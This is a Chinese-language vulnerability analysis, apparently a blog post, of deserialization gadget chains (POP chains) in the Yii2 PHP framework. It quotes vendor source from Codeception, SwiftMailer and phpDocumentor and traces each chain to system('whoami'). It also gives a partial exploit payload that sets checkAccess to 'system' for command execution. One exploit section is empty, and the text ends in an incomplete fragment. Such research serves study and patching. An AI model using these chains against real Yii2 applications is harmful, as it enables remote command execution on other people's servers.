0x01 前期准备

书接上回

在 yii2 version < =2.0.37 时，可通过yii\db\BatchQueryResult::__destruct() 触发反序列化漏洞。
但在2.0.38之后，该类添加了__wakeup()魔术方法，被禁止反序列化。
所以我们需要找到其他的反序列化入口。

反序列化入口的类需要满足几个条件：

1.存在__destruct()或__wakeup()魔术方法。

2.并且__wakeup()魔术方法对反序列化进行限制。

在下载了目前为止所有版本的源码包之后，对所有满足条件的类进行筛选。从中整理了所有可以作为入口点的类，如下：

反序列化起点触发方法存在版本
BatchQueryResult__destruct()<= 2.0.37
RunProcess__destruct()<= 2.0.42
AbstractSmtpTransport__destruct()<= 2.0.40
DiskKeyCache__destruct()<= 2.0.40
TemporaryFileByteStream__destruct()<= 2.0.40
UnicodeString__wakeup()<= 2.0.40

为了方便代码调试，测试环境采用双版本，yii-basic-app-2.0.38.tgz和yii-basic-app-2.0.40.tgz。

环境的搭建与调试，请参考前篇《从零开始的Yii2框架学习之旅》。

0x02 漏洞分析及复现

POP1

反序列化起点在/vendor/codeception/codeception/ext/RunProcess.php文件中，以下是精简后的代码。

<?php
namespace Codeception\Extension;
use Codeception\Events;use Codeception\Exception\ExtensionException;use Codeception\Extension;use Symfony\Component\Process\Process;
class RunProcess extends Extension{
    private $processes = [];
    public function __destruct(){        $this->stopProcess();    }
    public function stopProcess(){        foreach (array_reverse($this->processes) as $process) {            if (!$process->isRunning()) {                continue;            }        }    }}
__destruct()魔术方法触发 stopProcess() 方法，之后进行调用了isRunning()方法。这里$this->processes参数可控，可通过指定类，去触发__call()魔术方法。之后可续接前文中 Generator ->IndexAction的利用链，进行命令执行。
POP链如下：
Codeception\Extension\RunProcess::__destruct()->stopProcess()->$process->isRunning()->Faker\Generator::__call()->format()->call_user_func_array()->yii\rest\IndexAction::run->call_user_func()->system('whoami')
EXP：
<?php
namespace yii\rest {    class CreateAction {        public $checkAccess;        public $id;        public function __construct() {            $this->checkAccess="system";            $this->id="whoami";        }    }}
namespace Faker {    use yii\rest\CreateAction;    class Generator {        protected $formatters;        public function __construct() {            $this->formatters['isRunning'] = [new CreateAction(), 'run'];        }
    }}

经测试发现，Generator在2.0.38之后的版本中，进行了加固，无法成为POP链中的一环，所以该POP链适用条件为YII <= 2.0.38。
POP2
反序列化起点在/vendor/swiftmailer/swiftmailer/lib/classes/Swift/Transport/AbstractSmtpTransport.php文件中，以下是精简后的代码。
<?php

abstract class Swift_Transport_AbstractSmtpTransport implements Swift_Transport{    protected $started = false;    protected $eventDispatcher;
    public function stop(){        if ($this->started) {            if ($evt = $this->eventDispatcher->createTransportChangeEvent($this)) {                $this->eventDispatcher->dispatchEvent($evt, 'beforeTransportStopped');                if ($evt->bubbleCancelled()) {                    return;                }            }        }
    }
    public function __destruct(){        try {            $this->stop();        } catch (Exception $e) {        }    }}
__destruct()魔术方法触发 stop() 方法，之后进行调用了createTransportChangeEvent()方法。这里$this->started参数和$this->eventDispatcher参数可控，可通过指定类，去触发__call()魔术方法。之后可续接前文中 Generator ->IndexAction的利用链，进行命令执行。
POP链如下：
AbstractSmtpTransport::__destruct()->stop()->$this->eventDispatcher->createTransportChangeEvent()->Faker\Generator::__call()->format()->call_user_func_array()->yii\rest\IndexAction::run->call_user_func()->system('whoami')
由于本身的class通过abstract被定义为抽象类，无法进行实例化，可通过寻找继承该类的其他类进行实例化。
EXP：

POP3-1
反序列化起点在/vendor/swiftmailer/swiftmailer/lib/classes/Swift/KeyCache/DiskKeyCache.php文件中，以下是精简后的代码。
<?php
class Swift_KeyCache_DiskKeyCache implements Swift_KeyCache{    private $path;
    private $keys = [];

    public function clearKey($nsKey, $itemKey){        if ($this->hasKey($nsKey, $itemKey)) {            $this->freeHandle($nsKey, $itemKey);            unlink($this->path.'/'.$nsKey.'/'.$itemKey);        }    }
    public function clearAll($nsKey){        if (\array_key_exists($nsKey, $this->keys)) {            foreach ($this->keys[$nsKey] as $itemKey => $null) {                $this->clearKey($nsKey, $itemKey);            }            if (is_dir($this->path.'/'.$nsKey)) {                rmdir($this->path.'/'.$nsKey);            }            unset($this->keys[$nsKey]);        }    }
    public function __destruct(){        foreach ($this->keys as $nsKey => $null) {            $this->clearAll($nsKey);        }    }}
__destruct()魔术方法触发 clearAll() 方法，$this->keys参数可控。进一步调用了 clearKey() 方法，之后进行调用了unlink()方法。这里$this->path参数可控，触发__toString魔术方法。
寻找含有__toString()魔术方法的类，通过工具搜索关键字function __toString()，存在大量的类。
经过筛查后发现，部分类可利用，例如/basic/vendor/phpdocumentor/reflection-docblock/src/DocBlock/Tags/Deprecated.php，可通过调用render()函数，触发__call魔术方法。可利用的类很多，这里不一一列举。
之后可续接前文中 Generator ->IndexAction的利用链，进行命令执行。
POP链如下：
DiskKeyCache::__destruct()->clearAll()->clearKey()->unlink($this->path)->__toString()->phpDocumentor\Reflection\DocBlock\Tags\Deprecated->render()->Faker\Generator::__call()->format()->call_user_func_array()->yii\rest\IndexAction::run->call_user_func()->system('whoami')

<?php
namespace Symfony\Component\String;

    public function __wakeup(){        normalizer_is_normalized($this->string) ?: $this->string = normalizer_normalize($this->string);    }
